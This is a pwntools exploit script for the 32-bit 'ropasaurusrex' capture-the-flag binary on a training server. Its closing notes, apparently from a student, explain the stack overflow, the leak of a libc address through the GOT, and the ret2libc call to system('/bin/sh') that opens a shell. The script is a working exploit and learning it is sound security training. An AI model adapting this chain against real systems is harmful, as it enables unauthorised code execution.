from pwn import *
from sys import *

SERVER = "bin.training.offdef.it"
PORT = "2014"
BINARY = "./ropasaurusrex"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        b* 0x0804841b 
        c
        """)
    input("wait")


#code

def load_stack(chain):

    buff = b"A"*140
    
    for i in chain:
        if isinstance(i, int):
            buff+=p32(i)
        else:
            buff+=i
    r.send(buff)




write_addr = 0x0804830c #fd, buffer, size
main_addr = 0x0804841d
got_read_addr = 0x804961c



chain1 = [write_addr, main_addr,1,  got_read_addr, 4]

#pushchain(chain)
#c = cyclic_gen(n=4)

#buff = c.get(1000)

#r.send(buff)

#print(c.find(0x6261616b))

load_stack(chain1)
sleep(0.1)
libc_leak = u32(r.recv()) - 0x10a0c0 #offset calculated during running
sleep(0.1)

libc_system = libc_leak + 0x0048150
binsh = libc_leak + 0x1bd0f5

chain2= [libc_system, main_addr, binsh ]
load_stack(chain2)
sleep(0.5)


r.interactive()



"""
This challenge was resolved by the professor. It was the first 32 bit ctf. Remember that in 32bit the arguments
of a function are pushed on the stack, whereas in 64bit the arguments are loaded on the registers. 
What we have done was to use the buffer overflow to rewrite the eip with the fixed address of the write found with ghidra 
(no canary, no PIE, no Relro). With the write we wanted to leak a libc address to later use a gadget. 
Basically to find an available libc address we used the got. After the first read, the libc address is loaded 
in the got, so if we print the read_got_addr we leak one libc addr. We later calculated the offset from the beginnig
of libc by inspectioning the same run with vmmap. Later we tried differents gadgets, but none of them worked.
So we decided to use a system call in the libc ( we found it with command 'objdump -d libc-2.35.so | grep system')
with /bin/sh address (we found it with 'ghex lic-2.35.so' and searching manually).  
Now the chain is done. 

To see the opverflow index we used cyclic with n=4 (default is 64bit n=8)


we could also use pwn to get a lot of stuff

libc= ELF("./libc-2.35.so) links the lib to the script

we can search for symbols

system = libc.symbols['system']

or bytes

binsh = next(libc.search(b"bin/sh\x00"))

this stuff prints basically the offesets but if you set the addr of libc with
libc.address = 'your addr'

you get the true value for each command 
"""